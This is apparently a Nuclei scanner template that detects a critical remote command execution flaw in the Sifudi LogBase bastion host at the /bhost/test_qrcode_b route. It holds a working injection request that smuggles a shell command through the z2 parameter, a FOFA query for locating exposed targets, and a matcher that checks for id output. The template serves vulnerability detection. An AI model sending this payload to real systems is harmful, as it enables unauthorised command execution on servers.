id: logbase-test_qrcode_b-rce
info:
  name: 思福迪运维安全管理系统 test_qrcode_b - rce
  author: leadlife
  severity: critical
  description: 思福迪运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。思福迪运维安全管理系统 test_qrcode_b 路由存在命令执行漏洞，可以导致服务器被攻击者远控。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%80%9D%E7%A6%8F%E8%BF%AA%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%80%9D%E7%A6%8F%E8%BF%AA%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FRCE%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="思福迪-LOGBASE"
    hunter-query: demo
  tags: logbase,rce

http:
  - raw:
      - |
        POST /bhost/test_qrcode_b HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Go-http-client/1.1
        Content-Length: 23
        Accept-Encoding: gzip
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Referer: {{Hostname}}

        z1=1&z2="|id;"&z3=bhost
      
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"

      - type: status
        status:
          - 200